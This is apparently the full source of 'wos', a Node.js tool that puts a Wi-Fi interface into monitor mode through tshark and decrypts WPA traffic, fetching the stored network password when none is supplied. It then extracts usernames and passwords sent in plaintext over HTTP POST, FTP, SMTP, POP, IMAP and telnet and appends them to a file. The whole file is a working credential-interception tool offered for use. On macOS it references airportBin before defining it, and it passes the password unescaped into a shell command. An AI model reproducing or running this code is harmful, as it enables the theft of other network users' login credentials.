const fs = require('fs')
const qs = require('qs')
const path = require('path');
const {exec}= require('shelljs')
const JSONStream = require('JSONStream')
const through = require('through')
const meow = require('meow')
const {sync:commandExists} = require('command-exists')
const wifiInterface = require('wifi-interface')
const wifiSecurity = require('wifi-security')
const {sync:wifiName} = require('wifi-name')
const wifiPassword = require('wifi-password')

const formatPacket = require(`./src/formatPacket`)
const Gui = require(`./src/Gui`)
const {userFields, passFields} = require(`./src/fields`)

const cli = meow(`
    Usage
  $ wos [options]

    Info
      Capture interface is required. Use ifconfig command to find interfaces.

      SSID and password are required if using secured wifi such as WPA or WEP in order to decrypt packets.

      Wrap SSID and password in single quotes in order to escape special characters.

      After running wos, devices must send perform the EAPOL handshake in order for wos to decrypt their traffic. The handshake is initiated when the device connects or reconnects to the network.

    Options
      -i, --interface Capture interface
      -s, --ssid Wifi SSID
      -p, --pass Wifi password
      -c, --channel Wifi channel
      -n, --nomonitor Disable monitor mode
      -f, --format Format: dash (default), text
      -o, --outfile Output file
      -r, --readfile Read pcap file instead of monitoring

    Examples
      $ wos -i en0 --ssid='HomeWifi' --pass='d4Pazsw0rD' -o data.txt
  `, {
    boolean: [
      'nomonitor'
    ],
    string: [
      'interface',
      'ssid',
      'pass',
      'format',
      'outfile',
      'readfile'
    ],
    number: [
      'channel'
    ],
    alias: {
      i: 'interface',
      s: 'ssid',
      p: 'pass',
      c: 'channel',
      n: 'nomonitor',
      f: 'format',
      o: 'outfile',
      r: 'readfile'
    }
  }
)

;(async () => {
const {flags} = cli
const ssid = process.env.WOS_SSID || flags.ssid || wifiName()
let pass = process.env.WOS_PASS || flags.pass
const channel = process.env.WOS_CHANNEL || flags.channel
const interface = process.env.WOS_INTERFACE || flags.interface || wifiInterface()
const disableMonitor = process.env.WOS_NOMONITOR || flags.nomonitor
const outfile = process.env.WOS_OUTPUT || flags.outfile
let format = process.env.WOS_FORMAT || flags.format
let readfile = process.env.WOS_READ || flags.readfile

let isOpen = (wifiSecurity() === 'none')

if (!readfile && !pass && !isOpen) {
  try {
    pass = await wifiPassword()
  } catch (error) {

  }
}

if (!(format === 'dash' || format === 'text')) {
  format = 'dash'
}

if (!interface) {
  cli.showHelp()
  process.exit(0)
}

if (!commandExists('tshark')) {
  console.error('tshark command was not found. Please install wireshark https://www.wireshark.org/download.html')
  process.exit(0)
}

const monitor = disableMonitor ? '' : '-I'
let decKeys = ''

if (pass) {
  decKeys = `-o \"uat:80211_keys:\\\"wpa-pwd\\\",\\\"${pass}:${ssid}\\\"\"`
}

let captureOptions = `${monitor} -i ${interface} -o wlan.enable_decryption:TRUE ${decKeys}`

if (readfile) {
  captureOptions = `-r ${readfile}`
}

const displayFilters = `-Y \"tcp.port==80 or udp.port==80 or tcp.port==21 or tcp.port==110 or tcp.port==143 or tcp.port==25 or tcp.port==23 or eapol\"`

const outputFormat = '-T ek'

const noStderr = `2> /dev/null`

const cmd = `tshark ${captureOptions} ${outputFormat} ${displayFilters} ${noStderr}`

const gui = new Gui(format)

capture()

if (process.platform === 'darwin') {
  // set channel
  if (channel) {
    exec(`${airportBin} -c ${channel}`, {async: true, silent: true})
  }

  // show info panel
  const airportBin = '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport';

  const infoChild = exec(`${airportBin} -I`, {async: true, silent: true})
  infoChild.stdout.on('data', line => {
    if (line) {
      line.split('\n').forEach(x => {
        gui.infoLogAddRow(x)
      })
    }
  })

} else {
  gui.infoLogAddRow('Could not show wifi info')
}

function capture() {
  const child = exec(cmd, {async: true, silent: true})

  child.stdout
  .pipe(through(function write(data) {
    data = repairJsonString(data)
    this.queue(data)
  }))
  .pipe(JSONStream.parse('*').on('error', () => {
    // retry
    capture()
  }))
  .on('error', () => {})
  .on('data', processChunk)
}

function processChunk(json) {
  try {
    if (json.tcp) {
      processLayers(json)
    } else if (json.layers) {
      processLayers(json.layers)
    }
  } catch(error) {

  }
}

function repairJsonString(data) {
  return data.replace(/Form item: "(.*)" = "(.*)""/, function(match, p1, p2, offset, string) {
    return `Form item: \\"${p1}\" = \\"${p2}\\""`
  })
  .replace(/"tcp_flags_tcp_flags_str": ".*?",/, '')
}

function processLayers (layers) {
  if (typeof layers !== 'object') {
    return false
  }

  const {
    port,
    method,
    host,
    dstport,
    dstip,
    srcip,
    srcmac,
    httpData,
    eapolDataLen,
    wlanMac,
    wlanMacResolved,
    fullRequestUri,
    ftp,
    smtp,
    pop,
    imap,
    telnet,
    telnetData
  } = formatPacket(layers)

  /*
   * the fourth and final eapol packet finalizes the handshake
   * between client and router so there is no data.
   * EAPOL packets exchange PMK keys.
   */

  if (eapolDataLen === '0') {
    gui.connectionsLogAddRow(`${wlanMacResolved} ${wlanMac}`)
  }

  let account = ''
  let password = ''
  let data = ''

  const isHTTP = (port == 80)
  const isHTTPPost = (method === 'POST')
  const isFTP = (port == 21)
  const isPOP = (port == 110)
  const isIMAP = (port == 143)
  const isSMTP = (port == 25)
  const isTELNET = (port == 23)

  if (isHTTP) {
    if (httpData) {
      data = httpData
    }

    if (isHTTPPost) {
      let obj = null

      try {
        obj = JSON.parse(httpData)
      } catch(error) {
        obj = qs.parse(httpData)
      }

      var keys = Object.keys(obj)
      keys.forEach(key => {
        if (userFields.indexOf(key) > -1) {
          account = obj[key]
        } else if (passFields.indexOf(key) > -1) {
          password = obj[key]
        }
      })
    }

    if (isImage(fullRequestUri)) {
      gui.imageLogAddRow(fullRequestUri)
    }
  } else if (isFTP) {
    if (ftp) {
      const str = JSON.stringify(ftp)
      const userRegex = /USER (.*)\\r/i;
      const passRegex = /PASS (.*)\\r/i;

      if (userRegex.test(str)) {
        const match = str.match(userRegex)

        if (match && match.length > 1) {
          account =  match[1].trim().replace(/\\$/, '')
        }
      } else if (passRegex.test(str)) {
        const match = str.match(passRegex)
        if (match && match.length > 1) {
          password =  match[1].trim().replace(/\\$/, '')
        }
      }
    }
  } else if (isSMTP) {
    if (smtp) {
      const str = JSON.stringify(smtp)
      const userRegex = /username":"(.*)"/i
      const passRegex = /password":"(.*)"/i

      if (userRegex.test(str)) {
        const match = str.match(userRegex)
        if (match && match.length > 1) {
          account =  match[1].trim().replace(/\\$/, '')
        }
      } else if (passRegex.test(str)) {
        const match = str.match(passRegex)
        if (match && match.length > 1) {
          password =  match[1].trim().replace(/\\$/, '')
        }
      }
    }
  } else if (isPOP) {
    if (pop) {
      const str = JSON.stringify(pop)
      const userRegex = /USER (.*)/i;
      const passRegex = /PASS (.*)/i;

      if (userRegex.test(str)) {
        const match = str.match(userRegex)

        if (match && match.length > 1) {
          account =  match[1].trim().replace(/\\$/, '')
        }
      } else if (passRegex.test(str)) {
        const match = str.match(passRegex)
        if (match && match.length > 1) {
          password =  match[1].trim().replace(/\\$/, '')
        }
      }
    }
  } else if (isIMAP) {
    if (imap) {
      const str = JSON.stringify(imap)
      const passRegex = /LOGIN (.*?)\}/i;

      if (passRegex.test(str)) {
        const match = str.match(passRegex)
        if (match && match.length > 1) {
          password =  match[1].trim().replace(/\\$/, '')
        }
      }
    }
  } else if (isTELNET) {
    if (telnetData) {
      data = telnetData
    }
  }

  if (
    (isHTTPPost || isFTP || isPOP  || isIMAP || isSMTP || isTELNET) &&
    (account || password || data)) {
    const row = [account||'', password||'', port||'', host||'', dstip||'', srcip||'', srcmac||'', data||'']

    gui.addRow(row)

    if (outfile) {
      fs.appendFile(outfile, row.join('\t'), () => {})
    }
  }
}

function isImage (uri) {
  if (!uri) return false

  const pattern = /\.(png|gif|jpe?g|bmp)$/i

  return pattern.test(uri)
}
})()

// quit with ctrl-c
process.stdin.setRawMode(true)
process.stdin.on('data', (b) => {
  if (b[0] === 3) {
    process.stdin.setRawMode(false)
    process.exit()
  }
})

process.on('uncaughtException', (err) => {
  console.error('uncaughtException: ' + err.message)
  console.error(err.stack)
  process.exit(1)
});
